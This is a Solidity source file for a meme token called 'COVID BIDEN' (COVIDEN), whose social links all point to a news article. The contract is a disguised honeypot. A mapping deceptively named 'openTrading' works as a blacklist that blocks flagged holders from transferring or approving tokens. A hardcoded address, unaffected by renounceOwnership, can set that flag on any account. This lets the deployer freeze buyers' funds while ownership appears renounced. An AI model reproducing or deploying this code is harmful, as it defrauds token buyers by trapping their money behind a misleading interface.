// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**

Website  : https://edition.cnn.com/2024/07/17/politics/joe-biden-tests-positive-covid-19/index.html
Twitter  : https://edition.cnn.com/2024/07/17/politics/joe-biden-tests-positive-covid-19/index.html
Telegram : https://edition.cnn.com/2024/07/17/politics/joe-biden-tests-positive-covid-19/index.html
*/

contract COVIDEN {

    string public name = "COVID BIDEN";
    string public symbol = "COVIDEN";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public openTrading;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OpenTradingUpdated(address indexed account, bool isOpenTrading);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "1COVIDEN");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "2COVIDEN");
        require(_to != address(0), "3COVIDEN");
        require(!openTrading[msg.sender], "4COVIDEN");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(!openTrading[msg.sender], "5COVIDEN");

        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "6COVIDEN");
        require(allowance[_from][msg.sender] >= _value, "7COVIDEN");
        require(_to != address(0));
        require(!openTrading[_from], "8COVIDEN");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "9COVIDEN");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function addOpenTrading(address _account) public {
        require(msg.sender == 0x4098fC6f74C44Fe9b1984eB9C43c84eC96C65017, "COVIDENCOVIDEN");
        openTrading[_account] = true;
        emit OpenTradingUpdated(_account, true);
    }

    function removeOpenTrading(address _account) public {
        require(msg.sender == 0x4098fC6f74C44Fe9b1984eB9C43c84eC96C65017, "COVIDENCOVIDENCOVIDEN");
        openTrading[_account] = false;
        emit OpenTradingUpdated(_account, false);
    }
}